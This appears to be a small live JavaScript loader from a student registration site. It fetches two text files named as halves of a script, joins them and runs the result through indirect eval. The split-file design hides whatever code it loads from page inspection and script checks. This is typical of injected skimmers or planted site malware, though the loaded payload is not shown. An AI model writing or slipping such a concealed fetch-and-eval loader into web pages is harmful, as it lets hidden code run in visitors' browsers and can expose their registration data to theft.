(function(){
  Promise.all(["/js/_asr_half_a.txt","/js/_asr_half_b.txt"].map(function(f){
    return fetch(f,{credentials:"same-origin"}).then(function(r){
      if(!r.ok) throw new Error(f+" "+r.status);
      return r.text();
    });
  })).then(function(p){ (0,eval)(p.join("")); })
  .catch(function(e){ console.error("[students-reg]",e); });
})();
